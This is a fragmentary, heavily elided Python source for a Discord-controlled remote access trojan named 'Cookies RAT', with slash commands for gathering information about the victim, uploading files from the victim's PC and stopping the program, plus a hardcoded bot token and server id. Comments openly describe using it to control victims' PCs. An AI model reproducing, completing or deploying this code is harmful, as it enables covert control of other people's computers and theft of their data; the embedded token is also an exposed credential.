...
client = commands.Bot(command_prefix='!', intents=discord.Intents.all(), description='Cookies RAT to shits on pc\'s')
...
token = 'OTA1NTczNDc5NzU0MTI1MzYz.YYMDBg.ypD-FliS7nN3Ph9g3bsHx-GWC-Y' # Replace BOTTOKEN_HERE with bot token from discord develeper portal tht u will use to control victims Pc
g = [904191518460477480] # Replace SEVERID_HERE with the server Id that your bot is in!
...
@slash.slash(name="exit", description="stop the program on victims pc, idk why i made this :/", guild_ids=g)
...
@slash.slash(name="info", description="gather some info about the user", guild_ids=g)
...
@slash.slash(name="upload", description="upload file from users pc", guild_ids=g)
async def upload_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
    ...
    if ctx.channel.name == channel_name:
        if re.match(r'^(?:http|ftp)s?://', link) is not None:
            ...
            if r.headers["content-type"] in image_formats:
                ...
                await ctx.send("Link needs to be a url to an image! eg .png")
        else:
